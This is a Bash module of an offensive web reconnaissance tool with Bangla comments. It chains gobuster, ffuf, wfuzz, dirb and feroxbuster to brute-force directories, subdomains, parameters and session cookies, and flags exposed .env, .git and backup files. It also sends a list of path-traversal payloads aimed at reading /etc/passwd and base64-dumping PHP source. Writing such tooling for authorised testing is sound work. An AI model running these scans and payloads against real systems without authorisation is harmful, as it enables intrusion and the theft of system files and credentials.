#!/bin/bash
# ================================================================
#   SAIMUM v3.0 — directory.sh — Stage 4: Directory Discovery
# ================================================================

run_gobuster() {
    local target="$1"
    local out="$OUTPUT_DIR/34_gobuster_dir.txt"
    command -v gobuster &>/dev/null || { log_skip "gobuster"; return; }
    [ -z "$WORDLIST" ] && { log_warn "Wordlist নেই — gobuster skip।"; return; }

    local ext="-x php,html,txt,bak,xml,json,js,zip,env,config,old,sql"
    local threads="-t 20"
    [ "$SCAN_MODE" -eq 1 ] && threads="-t 5"
    [ "$SCAN_MODE" -eq 3 ] && threads="-t 50"

    # DIR mode
    run_tool "Gobuster DIR" \
        "gobuster dir -u http://$target -w $WORDLIST $ext $threads --no-progress -q" \
        "$out" "$TIMEOUT_GOBUSTER"

    grep -E "\.php" "$out" 2>/dev/null | awk '{print $1}' | \
        while read -r p; do PHP_FILES+=("http://$target$p"); done
    grep -Ei "login|admin|signin|auth|dashboard" "$out" 2>/dev/null | awk '{print $1}' | \
        while read -r p; do LOGIN_PAGES+=("http://$target$p"); done
    grep -Ei "\.bak|backup|\.old|\.env|config|\.git|\.svn|\.htpasswd|web\.config" "$out" 2>/dev/null | \
        while read -r l; do log_critical "Sensitive file exposed: $l"; done

    # DNS mode — subdomain bruteforce
    if [ "$SCAN_MODE" -ge 2 ] && [ -n "$TARGET_DOMAIN" ]; then
        local out_dns="$OUTPUT_DIR/34b_gobuster_dns.txt"
        select_dns_wordlist
        [ -n "$DNS_WORDLIST" ] && \
            run_tool "Gobuster DNS" \
                "gobuster dns -d $TARGET_DOMAIN -w $DNS_WORDLIST -q" \
                "$out_dns" 180
        grep "Found:" "$out_dns" 2>/dev/null | awk '{print $2}' | \
            while read -r s; do FOUND_SUBDOMAINS+=("$s"); done
    fi

    # VHOST mode
    if [ "$SCAN_MODE" -eq 3 ] && [ -n "$TARGET_IP" ]; then
        local out_vhost="$OUTPUT_DIR/34c_gobuster_vhost.txt"
        [ -n "$WORDLIST" ] && \
            run_tool "Gobuster VHOST" \
                "gobuster vhost -u http://$TARGET_IP -w $WORDLIST --append-domain -q" \
                "$out_vhost" 180
    fi

    local found; found=$(grep -c "^/" "$out" 2>/dev/null || echo 0)
    write_bangla "$OUTPUT_DIR/34_gobuster_bangla.txt" \
        "  Gobuster DIR — বাংলা বিশ্লেষণ" \
        "📁 মোট $found টি directory/file পাওয়া গেছে।" \
        "💡 Backup file এ database password থাকতে পারে।" \
        "   Admin panel পেলে brute force করা যায়।"
}

run_ffuf() {
    local target="$1"
    command -v ffuf &>/dev/null || { log_skip "ffuf"; return; }
    [ -z "$WORDLIST" ] && return

    local rate=""
    [ "$SCAN_MODE" -eq 1 ] && rate="-rate 10"
    [ "$SCAN_MODE" -eq 3 ] && rate="-rate 500"

    # Mode 1: Directory fuzzing
    local out_dir="$OUTPUT_DIR/35_ffuf_dir.txt"
    run_tool "ffuf DIR" \
        "ffuf -u http://$target/FUZZ -w $WORDLIST $rate -mc 200,301,302,403 -of json -o $out_dir -s" \
        "$out_dir" "$TIMEOUT_FFUF"

    # Mode 2: GET Parameter fuzzing
    if [ ${#PHP_FILES[@]} -gt 0 ]; then
        local out_param="$OUTPUT_DIR/35b_ffuf_param.txt"
        run_tool "ffuf GET Params" \
            "ffuf -u ${PHP_FILES[0]}?FUZZ=test -w $WORDLIST $rate -mc 200,301,302 -s" \
            "$out_param" "$TIMEOUT_FFUF"
    fi

    # Mode 3: POST Parameter fuzzing
    if [ ${#LOGIN_PAGES[@]} -gt 0 ]; then
        local out_post="$OUTPUT_DIR/35c_ffuf_post.txt"
        run_tool "ffuf POST" \
            "ffuf -u ${LOGIN_PAGES[0]} -X POST -d 'FUZZ=test' -w $WORDLIST $rate -mc 200,302 -s" \
            "$out_post" "$TIMEOUT_FFUF"
    fi

    # Mode 4: Vhost/Subdomain fuzzing (Aggressive)
    if [ "$SCAN_MODE" -eq 3 ] && [ -n "$TARGET_DOMAIN" ]; then
        local out_vhost="$OUTPUT_DIR/35d_ffuf_vhost.txt"
        select_dns_wordlist
        [ -n "$DNS_WORDLIST" ] && \
            run_tool "ffuf VHOST" \
                "ffuf -u http://$target -w $DNS_WORDLIST -H 'Host: FUZZ.$TARGET_DOMAIN' -mc 200,301,302 -s" \
                "$out_vhost" 180
    fi

    # Mode 5: Header fuzzing
    if [ "$SCAN_MODE" -eq 3 ]; then
        local out_hdr="$OUTPUT_DIR/35e_ffuf_header.txt"
        run_tool "ffuf Header" \
            "ffuf -u http://$target -w $WORDLIST -H 'X-Custom-Header: FUZZ' -mc 200,500 -s" \
            "$out_hdr" 120
    fi

    local cnt; cnt=$(grep -c '"status":200' "$out_dir" 2>/dev/null || echo 0)
    write_bangla "$OUTPUT_DIR/35_ffuf_bangla.txt" \
        "  ffuf (multi-mode) — বাংলা বিশ্লেষণ" \
        "⚡ DIR: $cnt টি 200 response।" \
        "💡 ffuf directory, parameter, vhost, header সব fuzz করেছে।"
}

run_wfuzz() {
    local target="$1"
    command -v wfuzz &>/dev/null || { log_skip "wfuzz"; return; }
    [ -z "$WORDLIST" ] && return

    local hc="--hc 404"
    [ "$SCAN_MODE" -eq 1 ] && hc="--hc 404,403"

    # Mode 1: Directory
    local out_dir="$OUTPUT_DIR/36_wfuzz_dir.txt"
    run_tool "wfuzz DIR" \
        "wfuzz -c $hc -w $WORDLIST http://$target/FUZZ" \
        "$out_dir" "$TIMEOUT_FFUF"

    # Mode 2: POST parameter fuzzing
    if [ ${#LOGIN_PAGES[@]} -gt 0 ]; then
        local out_post="$OUTPUT_DIR/36b_wfuzz_post.txt"
        run_tool "wfuzz POST" \
            "wfuzz -c $hc -w $WORDLIST -d 'FUZZ=test' ${LOGIN_PAGES[0]}" \
            "$out_post" "$TIMEOUT_FFUF"
    fi

    # Mode 3: Cookie fuzzing (Aggressive)
    if [ "$SCAN_MODE" -eq 3 ]; then
        local out_cookie="$OUTPUT_DIR/36c_wfuzz_cookie.txt"
        run_tool "wfuzz Cookie" \
            "wfuzz -c $hc -w $WORDLIST -b 'SESSIONID=FUZZ' http://$target/" \
            "$out_cookie" 120
    fi

    local cnt; cnt=$(grep -cE "C=200|C=301|C=302" "$out_dir" 2>/dev/null || echo 0)
    write_bangla "$OUTPUT_DIR/36_wfuzz_bangla.txt" \
        "  wfuzz (multi-mode) — বাংলা বিশ্লেষণ" \
        "🎯 DIR: $cnt টি interesting response।" \
        "💡 wfuzz directory, POST parameter ও cookie fuzz করেছে।"
}

run_dirb() {
    local target="$1"
    local out="$OUTPUT_DIR/37_dirb.txt"
    command -v dirb &>/dev/null || { log_skip "dirb"; return; }

    local wl=""
    [ -n "$WORDLIST" ] && wl="$WORDLIST"
    run_tool "dirb" "dirb http://$target $wl -o $out -S -r" "$out" 180

    local found; found=$(grep -c "CODE:200" "$out" 2>/dev/null || echo 0)
    write_bangla "$OUTPUT_DIR/37_dirb_bangla.txt" \
        "  dirb — বাংলা বিশ্লেষণ" \
        "📁 dirb মোট $found টি entry পেয়েছে।" \
        "💡 dirb ও gobuster একসাথে বেশি coverage দেয়।"
}

run_feroxbuster() {
    local target="$1"
    local out="$OUTPUT_DIR/38_feroxbuster.txt"
    command -v feroxbuster &>/dev/null || { log_skip "feroxbuster"; return; }
    [ "$SCAN_MODE" -ne 3 ] && return   # Only aggressive
    [ -z "$WORDLIST" ] && return

    run_tool "feroxbuster" \
        "feroxbuster -u http://$target -w $WORDLIST -x php,html,txt,js -q --no-state" \
        "$out" 240

    grep -Ei "\.bak|\.env|backup|config" "$out" 2>/dev/null | \
        while read -r l; do log_critical "feroxbuster — Sensitive file: $l"; done

    write_bangla "$OUTPUT_DIR/38_feroxbuster_bangla.txt" \
        "  feroxbuster — বাংলা বিশ্লেষণ" \
        "🔍 Recursive directory discovery সম্পন্ন।" \
        "💡 feroxbuster subdirectory recursively খোঁজে।"
}

run_lfi_check() {
    local target="$1"
    local out="$OUTPUT_DIR/39_lfi.txt"
    [ ${#PHP_FILES[@]} -eq 0 ] && return

    log_info "LFI/Path Traversal check করা হচ্ছে..."
    local payloads=(
        "../../../etc/passwd"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%252f..%252f..%252fetc%252fpasswd"
        "/etc/passwd"
        "php://filter/convert.base64-encode/resource=index.php"
    )

    {
        echo "=== LFI / PATH TRAVERSAL TEST ==="
        local url="${PHP_FILES[0]}"
        for payload in "${payloads[@]}"; do
            local resp
            resp=$(curl -sf --max-time 8 "${url}${payload}" 2>/dev/null)
            if echo "$resp" | grep -qE "root:.*:0:0|bin:.*:/bin"; then
                echo "VULNERABLE: $payload"
                log_critical "LFI/Path Traversal পাওয়া গেছে! /etc/passwd accessible!"
            fi
        done
        echo "LFI test complete."
    } | tee "$out"
    reg_file "lfi" "$out"
}

run_directory_discovery() {
    local target="$1"
    [ "$WEB_AVAILABLE" -eq 0 ] && log_warn "Web port নেই — Stage 4 skip।" && return
    show_stage 4 "DIRECTORY & FILE DISCOVERY"
    select_wordlist

    run_gobuster "$target"
    run_ffuf     "$target"
    run_wfuzz    "$target"

    # Run dirb as fallback or in aggressive
    if [ "$SCAN_MODE" -eq 3 ] || ! command -v gobuster &>/dev/null; then
        run_dirb "$target"
    fi
    [ "$SCAN_MODE" -eq 3 ] && run_feroxbuster "$target"
    run_lfi_check "$target"

    echo ""
    echo -e "${CYAN}${BOLD}  [*] Directory scan সিদ্ধান্ত:${NC}"
    [ ${#PHP_FILES[@]}   -gt 0 ] && log_info "PHP/param URL: ${#PHP_FILES[@]} টি → Injection testing হবে।"
    [ ${#LOGIN_PAGES[@]} -gt 0 ] && log_info "Login page: ${#LOGIN_PAGES[@]} টি → Auth testing হবে।"
    echo ""
    save_state
}
